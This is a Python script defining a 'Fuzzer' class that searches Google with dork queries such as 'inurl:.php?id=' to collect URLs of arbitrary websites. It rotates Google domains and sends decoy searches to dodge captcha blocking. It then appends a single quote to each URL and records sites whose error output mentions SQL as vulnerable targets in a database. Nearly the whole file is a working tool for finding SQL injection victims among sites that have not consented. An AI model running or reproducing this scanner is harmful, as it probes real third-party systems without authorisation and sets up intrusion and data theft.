#!/usr/bin/env python3

from lib.dbconnection import DatabaseSession
from random import choice
from time import sleep
from sys import exit
import bs4
import requests
import re

class Fuzzer(object):

    def __init__(self, pages=3):
        self.queries = [
                "inurl%3A+.php%3Fid%3D1",
                "inurl%3A+.php%3Fid%3D2",
                "inurl%3A+.php%3Fid%3D3",
                "inurl%3A+.php%3Fid%3D4",
                "inurl%3A+.php%3Fid%3D5",
                "inurl%3A+.php%3Fid%3D6",
                "inurl%3A+.php%3Fid%3D7",
                "inurl%3A+.php%3Fid%3D8",
                "inurl%3A+.php%3Fid%3D9",
                "inurl%3A+search.php%3Fq%3D"
                ]
        self.filters = [
                'facebook.com',
                'stackoverflow.com',
                'sqlvulnerablewebsites'
                ]
        self.domains = ['com', 'co.uk', 'ws', 'com.au']
        self.bogus_queries = ['amazon', 'google', 'facebook', 'twitter']
        self.session = DatabaseSession()
        self.websession = requests.Session()
        self.websession.headers.update(
            { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}
        )
        self.last_domain = None
        self.pages = pages

    def _skip_url(self, url):
        for item in self.filters:
            if item in url:
                return True
        return False

    def _send_bogus_query(self):
        query = choice(self.bogus_queries)
        self._send_query(query)

    def _send_query(self, query, page=1):
        suffix = self.last_domain
        while suffix == self.last_domain:
            suffix = choice(self.domains)
            if page == 1:
                address= "https://www.google.%s/search?q=%s" % (
                        suffix,
                        query
                    )
            else:
                address= "https://www.google.%s/search?q=%s&start=%s" % (
                        suffix,
                        query,
                        str(page*10)
                    )
        print("Querying %s: Page %s" % (address, page))
        self.last_domain = suffix
        return self.websession.get(address)

    def run_scan(self):
        for query in self.queries:
            results = self.get_endpoints(query)
            self.test_endpoints(results)
            print("Sending bogus query and sleeping additional 15 seconds")
            self._send_bogus_query()
            sleep(15)
            
    def get_endpoints(self, query):
        results = []
        for i in range(1, (self.pages+1)):
            page = self._send_query(query, page=i)
            if re.search('captcha', page.text.lower()):
                print("Detected captcha. We got got. Exiting")
                exit(1)
            else:
                soup = bs4.BeautifulSoup(page.text,"html.parser")
                for item in soup.find_all('h3', attrs={'class' : 'r'}):
                    results.append(item.a['href'][7:])
            print("Finished page %s. Sleeping 15 seconds" % i)
            sleep(15)
        return results

    def test_endpoints(self, results):
        relist = ["sql", "syntax"]
        for item in results:
            if not self._skip_url(item):
                url = "%s'" % item.split('&')[0]
                if not self.session._target_exists_in_db(url):
                    print("Testing %s" % url)
                    try:
                        response = self.websession.get(url, timeout=5)
                    except KeyboardInterrupt:
                        exit(1)
                    except:
                        print("Yucky URL: %s'" % url)
                        continue
                    for regex in relist:
                        if re.search(regex, response.text.lower()):
                            print("Potentially vulnerable: %s" % url)
                            self.session.add_target(url)
                        else:
                            continue
